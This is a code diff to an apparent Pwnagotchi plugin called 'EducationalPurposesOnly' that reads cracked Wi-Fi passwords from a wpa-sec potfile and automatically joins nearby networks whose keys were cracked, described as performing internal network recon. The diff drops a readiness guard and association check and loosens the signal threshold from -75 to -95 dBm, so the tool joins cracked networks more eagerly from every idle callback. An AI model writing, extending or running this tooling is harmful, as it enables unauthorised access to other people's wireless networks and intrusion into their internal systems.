@@ -22,7 +22,7 @@ NETWORK = ''
 
 class EducationalPurposesOnly(plugins.Plugin):
     __author__ = 'silentree12th'
-    __version__ = '1.0.3'
+    __version__ = '1.1.0'
     __license__ = 'GPL3'
     __description__ = 'A plugin to automatically authenticate to known networks and perform internal network recon. Saves wifi informations to wpa_supplicant.'
 
@@ -30,9 +30,7 @@ class EducationalPurposesOnly(plugins.Plugin):
         self.access_points = ""
 
     def on_loaded(self):
-        global READY
         logging.info("[woop-woop] loaded")
-        READY = 1
     
     def display_text(self, text):
         global STATUS
@@ -59,7 +57,6 @@ class EducationalPurposesOnly(plugins.Plugin):
             ui.set('status', 'PWND!')
 
     def _connect_to_target_network(self, network_name, channel):
-        global READY
         global STATUS
         global NETWORK
         NETWORK = network_name
@@ -111,7 +108,6 @@ class EducationalPurposesOnly(plugins.Plugin):
         subprocess.Popen('dhclient wlan0', shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
         time.sleep(10)
         STATUS = 'associated'
-        READY = 1
         
     def _restart_monitor_mode(self):
         logging.info('[woop-woop] resuming wifi recon and monitor mode...')
@@ -131,92 +127,80 @@ class EducationalPurposesOnly(plugins.Plugin):
         requests.post('http://127.0.0.1:8081/api/session', data='{"cmd":"wifi.recon on"}', auth=('pwnagotchi', 'pwnagotchi'))
         
     def on_bored(self, agent):
-        global READY
         global STATUS
-        if READY == 1 and "Not-Associated" in os.popen('iwconfig wlan0').read():
-            potfile = _run("cat /root/handshakes/wpa-sec.cracked.potfile | awk -F: '{print $3 \":\" $4}'").splitlines()
-            pwned_networks = {}
-            for line in potfile:
-                network = line.split(":")
-                pwned_networks[network[0]] = network[1]
-            for network in self.access_points:
-                if network["hostname"] in pwned_networks:
-                    signal_strength = network["rssi"]
-                    channel = network["channel"]
-                    logging.info("[woop-woop] FOUND known network nearby on channel %d (rssi: %d)" % (channel, signal_strength))
-                    if signal_strength >= -75:
-                        logging.info("[woop-woop] Starting association...")
-                        READY = 0
-                        self._connect_to_target_network(network['hostname'], channel)
-                    else:
-                        logging.info("[woop-woop] The signal strength is too low (%d) to connect." % (signal_strength))
-                        STATUS = 'rssi_low'
+        potfile = _run("cat /root/handshakes/wpa-sec.cracked.potfile | awk -F: '{print $3 \":\" $4}'").splitlines()
+        pwned_networks = {}
+        for line in potfile:
+            network = line.split(":")
+            pwned_networks[network[0]] = network[1]
+        for network in self.access_points:
+            if network["hostname"] in pwned_networks:
+                signal_strength = network["rssi"]
+                channel = network["channel"]
+                logging.info("[woop-woop] FOUND known network nearby on channel %d (rssi: %d)" % (channel, signal_strength))
+                if signal_strength >= -95:
+                    logging.info("[woop-woop] Starting association...")
+                    self._connect_to_target_network(network['hostname'], channel)
+                else:
+                    logging.info("[woop-woop] The signal strength is too low (%d) to connect." % (signal_strength))
+                    STATUS = 'rssi_low'
                         
     def on_sad(self, agent):
-        global READY
         global STATUS
-        if READY == 1 and "Not-Associated" in os.popen('iwconfig wlan0').read():
-            potfile = _run("cat /root/handshakes/wpa-sec.cracked.potfile | awk -F: '{print $3 \":\" $4}'").splitlines()
-            pwned_networks = {}
-            for line in potfile:
-                network = line.split(":")
-                pwned_networks[network[0]] = network[1]
-            for network in self.access_points:
-                if network["hostname"] in pwned_networks:
-                    signal_strength = network["rssi"]
-                    channel = network["channel"]
-                    logging.info("[woop-woop] FOUND known network nearby on channel %d (rssi: %d)" % (channel, signal_strength))
-                    if signal_strength >= -75:
-                        logging.info("[woop-woop] Starting association...")
-                        READY = 0
-                        self._connect_to_target_network(network['hostname'], channel)
-                    else:
-                        logging.info("[woop-woop] The signal strength is too low (%d) to connect." % (signal_strength))
-                        STATUS = 'rssi_low'
+        potfile = _run("cat /root/handshakes/wpa-sec.cracked.potfile | awk -F: '{print $3 \":\" $4}'").splitlines()
+        pwned_networks = {}
+        for line in potfile:
+            network = line.split(":")
+            pwned_networks[network[0]] = network[1]
+        for network in self.access_points:
+            if network["hostname"] in pwned_networks:
+                signal_strength = network["rssi"]
+                channel = network["channel"]
+                logging.info("[woop-woop] FOUND known network nearby on channel %d (rssi: %d)" % (channel, signal_strength))
+                if signal_strength >= -95:
+                    logging.info("[woop-woop] Starting association...")
+                    self._connect_to_target_network(network['hostname'], channel)
+                else:
+                    logging.info("[woop-woop] The signal strength is too low (%d) to connect." % (signal_strength))
+                    STATUS = 'rssi_low'
 
     def on_sleep(self, agent, t):
-        global READY
         global STATUS
-        if READY == 1 and "Not-Associated" in os.popen('iwconfig wlan0').read():
-            potfile = _run("cat /root/handshakes/wpa-sec.cracked.potfile | awk -F: '{print $3 \":\" $4}'").splitlines()
-            pwned_networks = {}
-            for line in potfile:
-                network = line.split(":")
-                pwned_networks[network[0]] = network[1]
-            for network in self.access_points:
-                if network["hostname"] in pwned_networks:
-                    signal_strength = network["rssi"]
-                    channel = network["channel"]
-                    logging.info("[woop-woop] FOUND known network nearby on channel %d (rssi: %d)" % (channel, signal_strength))
-                    if signal_strength >= -75:
-                        logging.info("[woop-woop] Starting association...")
-                        READY = 0
-                        self._connect_to_target_network(network['hostname'], channel)
-                    else:
-                        logging.info("[woop-woop] The signal strength is too low (%d) to connect." % (signal_strength))
-                        STATUS = 'rssi_low'
+        potfile = _run("cat /root/handshakes/wpa-sec.cracked.potfile | awk -F: '{print $3 \":\" $4}'").splitlines()
+        pwned_networks = {}
+        for line in potfile:
+            network = line.split(":")
+            pwned_networks[network[0]] = network[1]
+        for network in self.access_points:
+            if network["hostname"] in pwned_networks:
+                signal_strength = network["rssi"]
+                channel = network["channel"]
+                logging.info("[woop-woop] FOUND known network nearby on channel %d (rssi: %d)" % (channel, signal_strength))
+                if signal_strength >= -95:
+                    logging.info("[woop-woop] Starting association...")
+                    self._connect_to_target_network(network['hostname'], channel)
+                else:
+                    logging.info("[woop-woop] The signal strength is too low (%d) to connect." % (signal_strength))
+                    STATUS = 'rssi_low'
 
     def on_wait(self, agent, t):
-        global READY
         global STATUS
-        if READY == 1 and "Not-Associated" in os.popen('iwconfig wlan0').read():
-            potfile = _run("cat /root/handshakes/wpa-sec.cracked.potfile | awk -F: '{print $3 \":\" $4}'").splitlines()
-            pwned_networks = {}
-            for line in potfile:
-                network = line.split(":")
-                pwned_networks[network[0]] = network[1]
-            for network in self.access_points:
-                if network["hostname"] in pwned_networks:
-                    signal_strength = network["rssi"]
-                    channel = network["channel"]
-                    logging.info("[woop-woop] FOUND known network nearby on channel %d (rssi: %d)" % (channel, signal_strength))
-                    if signal_strength >= -75:
-                        logging.info("[woop-woop] Starting association...")
-                        READY = 0
-                        self._connect_to_target_network(network['hostname'], channel)
-                    else:
-                        logging.info("[woop-woop] The signal strength is too low (%d) to connect." % (signal_strength))
-                        STATUS = 'rssi_low'
+        potfile = _run("cat /root/handshakes/wpa-sec.cracked.potfile | awk -F: '{print $3 \":\" $4}'").splitlines()
+        pwned_networks = {}
+        for line in potfile:
+            network = line.split(":")
+            pwned_networks[network[0]] = network[1]
+        for network in self.access_points:
+            if network["hostname"] in pwned_networks:
+                signal_strength = network["rssi"]
+                channel = network["channel"]
+                logging.info("[woop-woop] FOUND known network nearby on channel %d (rssi: %d)" % (channel, signal_strength))
+                if signal_strength >= -95:
+                    logging.info("[woop-woop] Starting association...")
+                    self._connect_to_target_network(network['hostname'], channel)
+                else:
+                    logging.info("[woop-woop] The signal strength is too low (%d) to connect." % (signal_strength))
+                    STATUS = 'rssi_low'
 
         
     def on_wifi_update(self, agent, access_points):
